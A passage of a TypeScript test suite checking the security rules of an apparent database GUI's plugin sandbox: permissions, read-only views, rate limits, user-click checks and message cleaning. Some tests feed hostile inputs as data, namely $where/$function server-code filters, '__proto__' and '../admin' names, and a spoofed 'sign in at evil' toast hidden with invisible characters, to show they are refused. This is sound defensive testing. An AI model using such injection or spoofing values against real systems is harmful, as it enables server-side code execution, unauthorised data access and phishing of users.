    const active = () => tabs.tabs.find((t) => t.id === tabs.activeId)
    expect((await ask(3, 'ui.importSql'))!.result).toBe(true)
    expect(active()).toMatchObject({
      kind: 'sqlTransfer',
      params: { part: 'import', connectionId: 'c1', db: 'shop' },
    })
    expect((await ask(4, 'ui.exportSql'))!.result).toBe(true)
    expect(active()).toMatchObject({
      kind: 'sqlTransfer',
      params: { part: 'export', connectionId: 'c1', db: 'shop', coll: 'places' },
    })
    expect(dialogs.current).toBeNull()
  })

  // User request 2026-10-10: plugins on views too — reading as on a collection, never writing.
  it('runs on a view: says so, reads, lists no indexes, exports as the app does, never writes', async () => {
    const { calls } = frame(
      {
        plugin: runtime({ permissions: ['documents:read', 'documents:write', 'collection:read'] }),
        target: { connectionId: 'c1', db: 'views', coll: 'recent' },
      },
      {
        'GET connections/c1/databases/views/collections': () => [
          200,
          [
            { name: 'orders', type: 'collection', options: {}, readOnly: false },
            { name: 'recent', type: 'view', options: { viewOn: 'orders' }, readOnly: true },
          ],
        ],
        'POST connections/c1/databases/views/collections/recent/find': () => [
          200,
          { documents: [{ document: { _id: 1, n: 1 }, hash: 'h' }], hasMore: false },
        ],
      },
    )
    const { ask } = await iframe()
    const context = (await ask(1, 'context.get'))!.result as { place: { view: boolean } }
    expect(context.place.view).toBe(true)
    expect((await ask(2, 'documents.find', { filter: {} }))!.result).toMatchObject({
      documents: [{ _id: 1, n: 1 }],
    })
    expect((await ask(3, 'indexes.list'))!.result).toEqual([])
    expect((await ask(4, 'documents.update', { id: 1, set: { n: 2 } }))!.error!.code).toBe('read_only')
    expect((await ask(5, 'ui.exportSql'))!.result).toBe(true)
    expect(
      calls.some((c) => c.path.includes('/indexes') || (c.method !== 'GET' && !c.path.endsWith('/find'))),
    ).toBe(false)
  })

  // Review "not judged" (2026-10-10): two changes sent at once — the second is busy, one question only.
  it('asks about one change at a time, even two sent in the same moment', async () => {
    const id = { $oid: '6ac625df13a09509ca0da14f' }
    frame(
      { plugin: runtime({ permissions: ['documents:read', 'documents:write'] }) },
      {
        'POST connections/c1/databases/shop/collections/places/documents/get': () => [
          200,
          { document: { _id: id }, hash: 'H1' },
        ],
      },
    )
    const { el, sent } = await iframe()
    send({ mm: 1, id: 1, method: 'documents.update', params: { id, set: { a: 1 } } }, el.contentWindow!)
    send({ mm: 1, id: 2, method: 'documents.update', params: { id, set: { b: 2 } } }, el.contentWindow!)
    await flushPromises()
    expect(document.querySelectorAll('[role="dialog"]')).toHaveLength(1)
    expect(sent.find((m) => m.id === 2)!.error!.code).toBe('busy')
  })

  // Review M1: the whole list decides (a view past the first 500 too); unknown is a view for a write.
  it('knows a view past the first 500 names, and writes nothing where the kind is unknown', async () => {
    const many = Array.from({ length: 600 }, (_, i) => ({ name: `c${i}`, type: 'collection', options: {} }))
    frame(
      {
        plugin: runtime({ permissions: ['documents:read', 'documents:write'] }),
        target: { connectionId: 'c1', db: 'big', coll: 'late' },
      },
      {
        'GET connections/c1/databases/big/collections': () => [
          200,
          [...many, { name: 'late', type: 'view', options: {} }],
        ],
      },
    )
    const { ask } = await iframe()
    expect(((await ask(1, 'context.get'))!.result as { place: { view: boolean } }).place.view).toBe(true)
    expect((await ask(2, 'documents.update', { id: 1, set: { a: 1 } }))!.error!.code).toBe('read_only')
  })

  it('refuses a write to a collection its database does not list, even listed again', async () => {
    const { calls } = frame(
      {
        plugin: runtime({ permissions: ['documents:read', 'documents:write'] }),
        target: { connectionId: 'c1', db: 'odd', coll: 'ghost' },
      },
      {
        'GET connections/c1/databases/odd/collections': () => [
          200,
          [{ name: 'other', type: 'collection', options: {} }],
        ],
      },
    )
    const { ask } = await iframe()
    expect((await ask(1, 'documents.update', { id: 1, set: { a: 1 } }))!.error!.code).toBe('read_only')
    expect(calls.filter((c) => c.path.endsWith('/odd/collections')).length).toBeGreaterThanOrEqual(1)
  })

  it('refuses a write when the collections cannot be listed, telling the plugin it is a collection', async () => {
    frame(
      {
        plugin: runtime({ permissions: ['documents:read', 'documents:write'] }),
        target: { connectionId: 'c1', db: 'down', coll: 'orders' },
      },
      {
        'GET connections/c1/databases/down/collections': () => [
          503,
          { code: 'UNAVAILABLE', message: 'down' },
        ],
      },
    )
    const { ask } = await iframe()
    expect(((await ask(1, 'context.get'))!.result as { place: { view: boolean } }).place.view).toBe(false)
    expect((await ask(2, 'documents.update', { id: 1, set: { a: 1 } }))!.error!.code).toBe('read_only')
  })

  it('tells a plugin on a collection it is not a view', async () => {
    frame(
      { plugin: runtime({ permissions: [] }), target: { connectionId: 'c1', db: 'views2', coll: 'orders' } },
      {
        'GET connections/c1/databases/views2/collections': () => [
          200,
          [{ name: 'orders', type: 'collection', options: {}, readOnly: false }],
        ],
      },
    )
    const { ask } = await iframe()
    expect(((await ask(1, 'context.get'))!.result as { place: { view: boolean } }).place.view).toBe(false)
  })

  // Review M15: as the tree, the palette and the collection tab: no import into a system database.
  it('opens no SQL import into a system database', async () => {
    for (const db of ['admin', 'local', 'config']) {
      document.body.innerHTML = ''
      frame({ plugin: runtime({ permissions: [] }), target: { connectionId: 'c1', db, coll: 'places' } })
      const { ask } = await iframe()
      expect((await ask(1, 'ui.importSql'))!.error!.code).toBe('not_permitted')
      expect(useWorkspaceDialogs().current).toBeNull()
    }
  })

  it('opens no SQL import for a user who may not import, no export for one who may not export', async () => {
    frame(
      { plugin: runtime({ permissions: [] }) },
      {
        'GET connections': () => [
          200,
          [{ ...connection, access: 'viewer', permissions: ['documents:read'], export: false }],
        ],
      },
    )
    const { ask } = await iframe()
    expect((await ask(1, 'ui.importSql'))!.error!.code).toBe('not_permitted')
    expect((await ask(2, 'ui.exportSql'))!.error!.code).toBe('not_permitted')
    expect(useWorkspaceDialogs().current).toBeNull()
  })

  it('copies through the same few messages a minute as its toasts (wave 1 review I1)', async () => {
    const writeText = vi.fn(async () => undefined)
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } })
    frame({ plugin: runtime({ permissions: [] }) })
    const { ask } = await iframe()
    for (let i = 0; i < 3; i++) await ask(i + 1, 'ui.toast', { message: `m${i}` })
    expect((await ask(4, 'ui.copy', { text: 'a' }))!.result).toBe(true)
    expect((await ask(5, 'ui.copy', { text: 'b' }))!.result).toBe(true)
    expect((await ask(6, 'ui.copy', { text: 'c' }))!.error!.code).toBe('too_many')
    expect(writeText).toHaveBeenCalledTimes(2)
  })

  // Security audit 2026-10-16 (M2, M5): a message reads as the plugin's, never the app's, and keeps
  // nothing that shows as nothing.
  it('names the plugin and its id on its messages, invisible characters left out', async () => {
    frame({ plugin: runtime({ permissions: [] }) })
    const { ask } = await iframe()
    await ask(1, 'ui.toast', { message: 'Session\u200b expired\u2060, sign\u00ad in\ufe0f at\u{e0041} evil' })
    const toast = useToastStore().toasts.at(-1)!.message
    expect(toast).toBe('Hello (hello): Session expired, sign in at evil')
  })

  it('refuses a document id or query parts that do not decode, opening nothing (wave 1 review M11)', async () => {
    frame({ plugin: runtime({ permissions: [] }) })
    const { ask } = await iframe()
    expect((await ask(1, 'ui.useQuery', { filter: { a: { $oid: 'zz' } } }))!.error!.code).toBe('bad_params')
    expect(useTabsStore().tabs.some((tab) => tab.kind === 'collection')).toBe(false)
  })

  it('names the plugin when it would replace a pipeline, asks one thing at a time, and stops after two noes (wave 1 review M1)', async () => {
    frame({ plugin: runtime({ permissions: [] }) })
    const { ask, el, sent } = await iframe()
    expect((await ask(1, 'ui.useAggregation', { stages: [{ $limit: 1 }] }))!.result).toBe(true)
    const state = useCollectionViewsStore().stateFor(useTabsStore().active!.id).aggregation
    // Not previewed until the user changes the stages or asks (review I2).
    expect(state.handed).toEqual({
      by: 'Hello (hello)',
      stages: JSON.stringify([{ $limit: { $numberInt: '1' } }]),
    })
    const askAgain = (id: number) => {
      send({ mm: 1, id, method: 'ui.useAggregation', params: { stages: [{ $limit: 2 }] } }, el.contentWindow!)
      return flushPromises()
    }
    await askAgain(2)
    expect(document.body.textContent).toContain('Hello (hello) wants to replace')
    el.focus()
    expect((await ask(3, 'ui.useAggregation', { stages: [{ $limit: 3 }] }))!.error!.code).toBe('busy')
    ;(document.querySelector('[data-test="cancel"]') as HTMLButtonElement).click()
    await flushPromises()
    expect(sent.find((m) => m.id === 2)!.error!.code).toBe('declined')
    el.focus()
    await askAgain(4)
    ;(document.querySelector('[data-test="cancel"]') as HTMLButtonElement).click()
    await flushPromises()
    el.focus()
    expect((await ask(5, 'ui.useAggregation', { stages: [{ $limit: 5 }] }))!.error!.code).toBe('blocked')
  })

  it('lets a cell renderer, out of sight, do nothing the user would see (wave 1 review I1)', async () => {
    const writeText = vi.fn(async () => undefined)
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } })
    frame({
      plugin: runtime({ permissions: ['documents:read', 'documents:write'] }),
      hidden: true,
      kind: 'cellRenderer',
      contribution: 'point',
    })
    await flushPromises()
    const el = document.querySelector<HTMLIFrameElement>('iframe[data-plugin-cells]')!
    const sent: Array<{ id: unknown; error?: { code: string } }> = []
    vi.spyOn(el.contentWindow!, 'postMessage').mockImplementation((d: unknown) => void sent.push(d as never))
    await loadPage(el, sent)
    const ask = async (id: number, method: string, params?: unknown) => {
      send({ mm: 1, id, method, params }, el.contentWindow!)
      await flushPromises()
      return sent.find((m) => m.id === id)
    }
    for (const [method, params] of [
      ['ui.copy', { text: 'x' }],
      ['ui.useQuery', { filter: {} }],
      ['ui.useAggregation', { stages: [{ $limit: 1 }] }],
      ['ui.openDocument', { id: 1 }],
      ['documents.update', { id: 1, set: { a: 1 } }],
    ] as const)
      expect((await ask(Math.random(), method, params))!.error!.code, method).toBe('not_visible')
    expect(writeText).not.toHaveBeenCalled()
  })

  it('runs no pipeline for a plugin not approved to read documents', async () => {
    frame({ plugin: runtime({ permissions: [] }) })
    const { ask } = await iframe()
    expect((await ask(1, 'documents.aggregate', { pipeline: [] }))!.error!.code).toBe('not_permitted')
  })

  it('reads its collection’s indexes only with collection:read (wave 2)', async () => {
    const indexes = [
      { name: '_id_', key: { _id: 1 }, options: {}, usage: { ops: 4, since: '2026-10-01T00:00:00.000Z' } },
    ]
    frame(
      { plugin: runtime({ permissions: ['documents:read', 'collection:read'] }) },
      { 'GET connections/c1/databases/shop/collections/places/indexes': () => [200, indexes] },
    )
    const { ask } = await iframe()
    expect((await ask(1, 'indexes.list'))!.result).toEqual(indexes)
  })

  it('reads no indexes without collection:read (wave 2)', async () => {
    frame()
    const { ask } = await iframe()
    expect((await ask(1, 'indexes.list'))!.error!.code).toBe('not_permitted')
  })

  // Research 2026-10-28 (reverse references): a query put in Documents of another collection of its
  // database, on the user's click, as ui.useQuery puts one in its own.
  it('puts a query in another collection of its database, with database:read only', async () => {
    frame(
      { plugin: runtime({ permissions: ['documents:read', 'database:read'] }) },
      {
        'GET connections/c1/databases/shop/collections': () => [
          200,
          [
            { name: 'places', type: 'collection', options: {}, readOnly: false },
            { name: 'orders', type: 'collection', options: {}, readOnly: false },
            { name: 'system.views', type: 'collection', options: {}, readOnly: true },
          ],
        ],
      },
    )
    const { ask } = await iframe()
    const filter = { customerId: { $oid: '65a1b2c3d4e5f60718293a4b' } }
    expect((await ask(1, 'ui.useQueryIn', { coll: 'orders', filter }))!.result).toBe(true)
    const tabs = useTabsStore()
    expect(tabs.active).toMatchObject({
      kind: 'collection',
      params: { connectionId: 'c1', db: 'shop', coll: 'orders' },
    })
    const state = useCollectionViewsStore().stateFor(tabs.active!.id)
    expect([state.section, state.query.filter]).toEqual(['documents', filter])
    // In place for the tab to run, at its first page, the user's page size kept.
    expect(state.page).toBe(0)
    expect(state.query.limit).toBe(state.draft.limit)
    for (const [n, params] of [
      [2, { coll: 'elsewhere', filter }],
      [3, { coll: 'system.views', filter }],
      [4, { coll: '__proto__', filter }],
      [5, { coll: 42, filter }],
      [6, { coll: 'orders', filter: { $where: 'sleep(1)' } }],
      [7, { coll: 'orders', filter: 'x' }],
      [8, { coll: 'orders', filter: { a: { $oid: 'not an id' } } }],
    ] as const)
      expect((await ask(n, 'ui.useQueryIn', params))!.error?.code, JSON.stringify(params)).toBe('bad_params')
  })

  // Review 2026-10-28: one click opened up to 10 tabs (calls in parallel), and a list read late put
  // the query in place after the frame had gone out of sight.
  it('puts one query in another collection at a time, and none once its frame is out of sight', async () => {
    const list: [number, unknown] = [
      200,
      [
        { name: 'places', type: 'collection', options: {}, readOnly: false },
        { name: 'orders', type: 'collection', options: {}, readOnly: false },
      ],
    ]
    let holding = false
    let release: () => void = () => {}
    const { wrapper } = frame(
      { plugin: runtime({ permissions: ['documents:read', 'database:read'] }) },
      {
        'GET connections/c1/databases/shop/collections': () =>
          holding ? new Promise((resolve) => (release = () => resolve(list))) : list,
      },
    )
    const { el, sent, ask } = await iframe()
    holding = true
    send({ mm: 1, id: 1, method: 'ui.useQueryIn', params: { coll: 'orders', filter: {} } }, el.contentWindow!)
    await flushPromises()
    expect((await ask(2, 'ui.useQueryIn', { coll: 'orders', filter: {} }))!.error!.code).toBe('busy')
    await wrapper.setProps({ inactive: true })
    release()
    await flushPromises()
    expect(sent.find((m) => m.id === 1)!.error!.code).toBe('not_visible')
    expect(useTabsStore().active?.params).not.toMatchObject({ coll: 'orders' })
    // Nor once the frame is gone: its tab was closed while the list was read (a new frame: the
    // first one keeps the list it read).
    wrapper.unmount()
    document.body.innerHTML = ''
    holding = false
    const second = frame(
      { plugin: runtime({ permissions: ['documents:read', 'database:read'] }) },
      {
        'GET connections/c1/databases/shop/collections': () =>
          holding ? new Promise((resolve) => (release = () => resolve(list))) : list,
      },
    )
    const next = await iframe()
    holding = true
    send(
      { mm: 1, id: 3, method: 'ui.useQueryIn', params: { coll: 'orders', filter: {} } },
      next.el.contentWindow!,
    )
    await flushPromises()
    second.wrapper.unmount()
    release()
    await flushPromises()
    expect(useTabsStore().active?.params).not.toMatchObject({ coll: 'orders' })
    // Nor once the user clicked elsewhere while the list was read: the click is no longer theirs.
    document.body.innerHTML = ''
    holding = false
    frame(
      { plugin: runtime({ permissions: ['documents:read', 'database:read'] }) },
      {
        'GET connections/c1/databases/shop/collections': () =>
          holding ? new Promise((resolve) => (release = () => resolve(list))) : list,
      },
    )
    const third = await iframe()
    holding = true
    send(
      { mm: 1, id: 4, method: 'ui.useQueryIn', params: { coll: 'orders', filter: {} } },
      third.el.contentWindow!,
    )
    await flushPromises()
    clickInApp()
    release()
    await flushPromises()
    expect(third.sent.find((m) => m.id === 4)!.error!.code).toBe('no_activation')
    expect(useTabsStore().active?.params).not.toMatchObject({ coll: 'orders' })
  })

  it('puts no query in another collection without database:read, nor without the user', async () => {
    frame({ plugin: runtime({ permissions: ['documents:read'] }) })
    const { ask } = await iframe()
    expect((await ask(1, 'ui.useQueryIn', { coll: 'orders', filter: {} }))!.error!.code).toBe('not_permitted')
    document.body.innerHTML = ''
    frame({ plugin: runtime({ permissions: ['documents:read', 'database:read'] }) })
    const second = await iframe()
    clickInApp()
    expect((await second.ask(2, 'ui.useQueryIn', { coll: 'orders', filter: {} }))!.error!.code).toBe(
      'no_activation',
    )
  })

  it('lists and reads the other collections of its own database only, with database:read (wave 2)', async () => {
    const { calls } = frame(
      { plugin: runtime({ permissions: ['documents:read', 'database:read'] }) },
      {
        'GET connections/c1/databases/shop/collections': () => [
          200,
          [
            { name: 'places', type: 'collection', options: {}, readOnly: false },
            { name: 'customers', type: 'collection', options: {}, readOnly: false },
            { name: 'recent', type: 'view', options: { viewOn: 'places' }, readOnly: true },
            { name: 'system.views', type: 'collection', options: {}, readOnly: true },
          ],
        ],
        'POST connections/c1/databases/shop/collections/customers/find': () => [
          200,
          { documents: [{ document: { _id: 1, name: 'Ada' }, hash: 'h' }], hasMore: false },
        ],
      },
    )
    const { ask } = await iframe()
    expect((await ask(1, 'collections.list'))!.result).toEqual([
      { name: 'places', type: 'collection' },
      { name: 'customers', type: 'collection' },
      { name: 'recent', type: 'view' },
    ])
    const filter = { _id: { $in: [1, 2] } }
    expect(
      (await ask(2, 'documents.findIn', { coll: 'customers', filter, projection: { name: 1 }, limit: 5 }))!
        .result,
    ).toEqual({ documents: [{ _id: 1, name: 'Ada' }] })
    expect(calls.find((c) => c.path.endsWith('/customers/find'))!.body).toEqual({
      filter,
      projection: { name: 1 },
      skip: 0,
      limit: 5,
      remember: false,
    })
    for (const [n, params] of [
      [3, { coll: 'elsewhere' }],
      [4, { coll: 'system.views' }],
      [5, { coll: '__proto__' }],
      [6, { coll: '../admin' }],
      [7, { coll: 42 }],
      [8, { coll: 'customers', limit: 201 }],
      [9, { coll: 'customers', filter: { $where: 'sleep(1)' } }],
      [10, { coll: 'customers', filter: { a: { $function: {} } } }],
      [11, { coll: 'customers', filter: 'x' }],
    ] as const)
      expect((await ask(n, 'documents.findIn', params))!.error!.code, JSON.stringify(params)).toBe(
        'bad_params',
      )
    expect(calls.filter((c) => c.path.endsWith('/find'))).toHaveLength(1)
  })

  it('lets a cell renderer read only where the app asked it about values (wave 2)', async () => {
    const { calls } = frame(
      {
        plugin: runtime({ permissions: ['documents:read', 'database:read'] }),
        hidden: true,
        kind: 'cellRenderer',
        contribution: 'point',
        target: null,
      },
      {
        'GET connections/c1/databases/shop/collections': () => [
          200,
          [{ name: 'customers', type: 'collection', options: {}, readOnly: false }],
        ],
        'POST connections/c1/databases/shop/collections/customers/find': () => [
          200,
          { documents: [{ document: { _id: 1, name: 'Ada' }, hash: 'h' }], hasMore: false },
        ],
      },
    )
    await flushPromises()
    const el = document.querySelector<HTMLIFrameElement>('iframe[data-plugin-cells]')!
    const sent: Array<{ id: unknown; result?: unknown; error?: { code: string } }> = []
    vi.spyOn(el.contentWindow!, 'postMessage').mockImplementation((d: unknown) => void sent.push(d as never))
    await loadPage(el, sent)
    const ask = async (id: number, method: string, params?: unknown) => {
      send({ mm: 1, id, method, params }, el.contentWindow!)
      await flushPromises()
      return sent.find((m) => m.id === id)
    }
    const place = { connectionId: 'c1', db: 'shop', coll: 'orders' }
    // Not asked about yet: nowhere to read.
    expect((await ask(1, 'documents.findIn', { place, coll: 'customers' }))!.error!.code).toBe(
      'no_collection',
    )
    rememberCellPlace('hello', place)
    expect((await ask(2, 'documents.findIn', { place, coll: 'customers', limit: 5 }))!.result).toEqual({
      documents: [{ _id: 1, name: 'Ada' }],
    })
    for (const [n, other] of [
      [3, { ...place, db: 'admin' }],
      [4, { ...place, connectionId: 'c2' }],
      [5, 'c1/shop/orders'],
    ] as const)
      expect((await ask(n, 'documents.findIn', { place: other, coll: 'customers' }))!.error!.code).toBe(
        'no_collection',
      )
    expect(calls.filter((c) => c.path.endsWith('/find'))).toHaveLength(1)
  })

  it('counts the wave 2 reads in the 60 a minute, a cell renderer’s too (review M13); indexes apart (wave 3)', async () => {
    const { calls } = frame(
      {
        plugin: runtime({ permissions: ['documents:read', 'collection:read', 'database:read'] }),
        hidden: true,
        kind: 'cellRenderer',
        contribution: 'point',
        target: null,
      },
      {
        'GET connections/c1/databases/shop/collections': () => [
          200,
          [{ name: 'customers', type: 'collection', options: {}, readOnly: false }],
        ],
        'GET connections/c1/databases/shop/collections/orders/indexes': () => [200, []],
        'POST connections/c1/databases/shop/collections/customers/find': () => [
          200,
          { documents: [], hasMore: false },
        ],
      },
    )
    await flushPromises()
    const el = document.querySelector<HTMLIFrameElement>('iframe[data-plugin-cells]')!
    const sent: Array<{ id: unknown; result?: unknown; error?: { code: string } }> = []
    vi.spyOn(el.contentWindow!, 'postMessage').mockImplementation((d: unknown) => void sent.push(d as never))
    await loadPage(el, sent)
    const place = { connectionId: 'c1', db: 'shop', coll: 'orders' }
    rememberCellPlace('hello', place)
    const ask = async (id: number, method: string, params?: unknown) => {
      send({ mm: 1, id, method, params }, el.contentWindow!)
      await flushPromises()
      return sent.find((m) => m.id === id)
    }
    const methods = [
      ['collections.list', { place }],
      ['documents.findIn', { place, coll: 'customers' }],
    ] as const
    for (let i = 0; i < 60; i++) {
      const [method, params] = methods[i % 2]!
      expect((await ask(i + 1, method, params))!.error, `${i} ${method}`).toBeUndefined()
    }
    for (const [n, [method, params]] of methods.entries())
      expect((await ask(100 + n, method, params))!.error!.code, method).toBe('too_many')
    expect(calls.filter((c) => c.path.endsWith('/customers/find'))).toHaveLength(30)
    // Plugins wave 3 (spec §1.3): indexes are definitions, read in a minute of their own.
    expect((await ask(200, 'indexes.list', { place }))!.error).toBeUndefined()
  })

  it('reads no other collection without database:read (wave 2)', async () => {
    frame()
    const { ask } = await iframe()
    expect((await ask(1, 'collections.list'))!.error!.code).toBe('not_permitted')
    expect((await ask(2, 'documents.findIn', { coll: 'customers' }))!.error!.code).toBe('not_permitted')
  })

  it('never runs server code for a plugin, even where the server would allow it (wave 2)', async () => {
    const { calls } = frame()
    const { ask } = await iframe()
    for (const filter of [{ $where: 'sleep(1)' }, { a: { $function: { body: '', args: [], lang: 'js' } } }])
      expect((await ask(Math.random(), 'documents.find', { filter }))!.error!.code).toBe('bad_params')
    expect((await ask(1, 'documents.find', { projection: { a: { $function: {} } } }))!.error!.code).toBe(
      'bad_params',
    )
    expect(calls.some((c) => c.path.endsWith('/find'))).toBe(false)
  })

  it('refuses document access where it was not opened on a collection', async () => {
    frame({ target: null, kind: 'sidebarPanel', contribution: 'side' })
    const { ask } = await iframe()
    expect((await ask(1, 'documents.find', {}))!.error!.code).toBe('no_collection')
  })
})

describe('what plugins add (phase 4b §3)', () => {
  // Security audit 2026-10-16 (M2): a renderer's text kept what shows as nothing.
  it('shows a renderer’s text without invisible characters', () => {
    expect(cellText({ text: 'Ist\u200banbul\u2060 \u00adis\ufe0f\u{e0041} near\u202e' }, 'hello')).toEqual({
      text: 'Istanbul is near',
      tone: 'neutral',
      plugin: 'hello',
    })
    expect(cellText({ text: '\u200b\u200c\u{e0020}' }, 'hello')).toBeNull()
  })

  it('puts document actions after the app’s own, for a document it can name', () => {
    const row = { key: 'k', kind: 'document' as const, raw: { _id: 1 }, hash: 'h', value: { _id: 1 } }
    const items = rowMenuItems(row, false, (k) => k, [{ id: 'plugin:hello:show', label: 'Show on map' }])
    expect(items.at(-1)).toMatchObject({ id: 'plugin:hello:show', separator: true })
    const noId = { ...row, raw: {}, value: {} }
    expect(
      rowMenuItems(noId, false, (k) => k, [{ id: 'plugin:hello:show', label: 'x' }]).some((i) =>
        i.id.startsWith('plugin:'),
      ),
    ).toBe(false)
  })

  it('asks a renderer about matching values in one batch, and shows its answer as plain text', async () => {
    const asked: unknown[] = []
    const bridge: Bridge = {
      ask: vi.fn(async (_m: string, params: unknown) => {
        asked.push(params)
        return (params as { values: unknown[] }).values.map((_, i) =>
          i === 0 ? { text: '<b>41.0, 29.0</b>', tone: 'info' } : { text: 'x\u202Ey', tone: 'evil' },
        )
      }),
      dispose: () => undefined,
      hello: () => undefined,
      notify: () => undefined,
    }
    const store = usePluginsStore()
    store.setRuntime([runtime()])
    store.setRenderer('hello', bridge)
    expect(matches('geojson', { type: 'Point', coordinates: [29, 41] })).toBe(true)
    expect(matches('geojson', { type: 'Point' })).toBe(false)
    expect(matches('objectId', decodeValue({ $oid: '6ac625df13a09509ca0da14f' }))).toBe(true)
    expect(matches('objectId', 'x')).toBe(false)
    expect(cellTextFor(store.cellPlugins, store.renderers, 'not geojson')).toBeNull()
    mountApp(PluginCellText, { props: { value: { type: 'Point', coordinates: [29, 41] } } })
    mountApp(PluginCellText, { props: { value: { type: 'Point', coordinates: [30, 40] } } })
    await flushPromises()
    await flushPromises()
    expect(bridge.ask).toHaveBeenCalledTimes(1)
    expect((asked[0] as { values: unknown[] }).values).toHaveLength(2)
    const cells = [...document.querySelectorAll('[data-plugin-cell]')]
    expect(cells[0]!.textContent).toBe('<b>41.0, 29.0</b>')
    expect(cells[0]!.querySelector('b')).toBeNull()
    expect(cells[1]!.textContent).toBe('xy')
    // Beside a long value the hint keeps its width; the value gives way (review 2026-10-13).
    expect(cells.every((c) => c.classList.contains('shrink-0'))).toBe(true)
  })

  it('shows what every renderer says of a value, each beside it (wave 2: time and reference together)', async () => {
    const answering = (text: string): Bridge => ({
      ask: vi.fn(async (_m: string, params: unknown) =>
        (params as { values: unknown[] }).values.map(() => ({ text })),
      ),
      dispose: () => undefined,
      hello: () => undefined,
      notify: () => undefined,
    })
    const store = usePluginsStore()
    store.setRuntime([runtime(), runtime({ id: 'other', name: { en: 'Other' } })])
    store.setRenderer('hello', answering('first'))
    store.setRenderer('other', answering('second'))
    mountApp(PluginCellText, { props: { value: { type: 'Point', coordinates: [29, 41] }, path: ['geo'] } })
    await flushPromises()
    await flushPromises()
    expect([...document.querySelectorAll('[data-plugin-cell]')].map((c) => c.textContent)).toEqual([
      'first',
      'second',
    ])
  })

  it('asks again, a while later, about a value whose answer did not come or was to be retried (review M2)', async () => {
    let now = 1_000_000
    vi.spyOn(Date, 'now').mockImplementation(() => now)
    let mode: 'retry' | 'fail' | 'answer' = 'retry'
    const bridge: Bridge = {
      ask: vi.fn(async (_m: string, params: unknown) => {
        if (mode === 'fail') throw new Error('timeout')
        return (params as { values: unknown[] }).values.map(() =>
          mode === 'retry' ? { retry: true } : { text: 'named' },
        )
      }),
      dispose: () => undefined,
      hello: () => undefined,
      notify: () => undefined,
    }
    const store = usePluginsStore()
    store.setRuntime([runtime()])
    store.setRenderer('hello', bridge)
    const value = { type: 'Point', coordinates: [29, 41] }
    const ask = async () => {
      cellTextFor(store.cellPlugins, store.renderers, value, 'geo')
      await flushPromises()
      await flushPromises()
      return cellTextFor(store.cellPlugins, store.renderers, value, 'geo')
    }
    expect(await ask()).toBeNull()
    mode = 'fail'
    // Not asked again at once…
    expect(await ask()).toBeNull()
    expect(bridge.ask).toHaveBeenCalledTimes(1)
    // …but after a while: it fails, and is asked again after another while.
    now += 31_000
    expect(await ask()).toBeNull()
    expect(bridge.ask).toHaveBeenCalledTimes(2)
    mode = 'answer'
    now += 31_000
    expect(await ask()).toMatchObject({ text: 'named' })
    expect(bridge.ask).toHaveBeenCalledTimes(3)
  })

  describe('inside nested values (user report 2026-10-10: items.productId had no reference)', () => {
    const oid = '6ac625df13a09509ca0da14f'
    function refs() {
      const asked: Array<{ values: unknown[]; paths?: unknown[] }> = []
      const bridge: Bridge = {
        ask: vi.fn(async (_m: string, params: unknown) => {
          const p = params as { values: unknown[]; paths?: unknown[] }
          asked.push(p)
          return p.values.map((_, i) => ({ text: `→ ${String(p.paths?.[i])}` }))
        }),
        dispose: () => undefined,
        hello: () => undefined,
        notify: () => undefined,
      }
      const store = usePluginsStore()
      store.setRuntime([
        runtime({
          contributes: {
            ...runtime().contributes,
            cellRenderers: [{ id: 'ref', match: 'objectId', display: 'inline' }],
          },
        }),
      ])
      store.setRenderer('hello', bridge)
      return asked
    }

    it('says what a renderer says of a value in a tree, by its path without array positions', async () => {
      const asked = refs()
      mountApp(TreeNode, {
        props: {
          name: '0',
          value: { productId: decodeValue({ $oid: oid }), qty: 3 },
          depth: 0,
          path: ['items', '0'],
          open: true,
        },
      })
      await flushPromises()
      await flushPromises()
      expect(asked.flatMap((a) => a.paths)).toEqual(['items.productId'])
      expect(document.querySelector('[data-plugin-cell]')!.textContent).toBe('→ items.productId')
    })

    it('gives a table cell’s nested values their whole path', async () => {
      const asked = refs()
      mountApp(NestedValue, {
        props: { value: [{ productId: decodeValue({ $oid: oid }) }], label: 'items', path: ['items'] },
      })
      await flushPromises()
      ;(document.querySelector('button') as HTMLButtonElement).click()
      await flushPromises()
      ;(document.querySelector('button[aria-label="Expand 0"]') as HTMLButtonElement).click()
      await flushPromises()
      await flushPromises()
      expect(asked.flatMap((a) => a.paths)).toEqual(['items.productId'])
    })
  })

  it('tells a renderer the collection of each value, asking per collection (wave 2)', async () => {
    const asked: Array<{ place?: unknown; values: unknown[] }> = []
    const bridge: Bridge = {
      ask: vi.fn(async (_m: string, params: unknown) => {
        const p = params as { values: unknown[]; place?: { coll: string } }
        asked.push(p)
        return p.values.map(() => ({ text: p.place?.coll ?? 'none' }))
      }),
      dispose: () => undefined,
      hello: () => undefined,
      notify: () => undefined,
    }
    const store = usePluginsStore()
    store.setRuntime([runtime()])
    store.setRenderer('hello', bridge)
    const point = { type: 'Point', coordinates: [29, 41] }
    // A table of one collection: its values' place provided to the cells inside.
    const In = (coll: string): Component => ({
      setup() {
        provideCellPlace(() => ({ connectionId: 'c1', db: 'shop', coll }))
        return () => h(PluginCellText, { value: point, path: ['geo'] })
      },
    })
    mountApp(In('places'))
    mountApp(In('stores'))
    await flushPromises()
    await flushPromises()
    expect(asked.map((a) => a.place)).toEqual([
      { connectionId: 'c1', db: 'shop', coll: 'places' },
      { connectionId: 'c1', db: 'shop', coll: 'stores' },
    ])
    expect([...document.querySelectorAll('[data-plugin-cell]')].map((c) => c.textContent)).toEqual([
      'places',
      'stores',
    ])
  })

  it('tells a renderer the column of each value (wave 2)', async () => {
    const asked: Array<{ paths?: unknown[] }> = []
    const bridge: Bridge = {
      ask: vi.fn(async (_m: string, params: unknown) => {
        const p = params as { values: unknown[]; paths?: unknown[] }
        asked.push(p)
        return p.values.map((_, i) => ({ text: String(p.paths?.[i]) }))
      }),
      dispose: () => undefined,
      hello: () => undefined,
      notify: () => undefined,
    }
    const store = usePluginsStore()
    store.setRuntime([runtime()])
    store.setRenderer('hello', bridge)
    const point = { type: 'Point', coordinates: [29, 41] }
    mountApp(PluginCellText, { props: { value: point, path: ['address', 'geo'] } })
    mountApp(PluginCellText, { props: { value: point, path: ['home'] } })
    await flushPromises()
    await flushPromises()
    expect(asked).toHaveLength(1)
    expect(asked[0]!.paths).toEqual(['address.geo', 'home'])
    const cells = [...document.querySelectorAll('[data-plugin-cell]')].map((c) => c.textContent)
    expect(cells).toEqual(['address.geo', 'home'])
  })

  it('asks in the app’s language, and again when it changes (wave 1 review M8)', async () => {
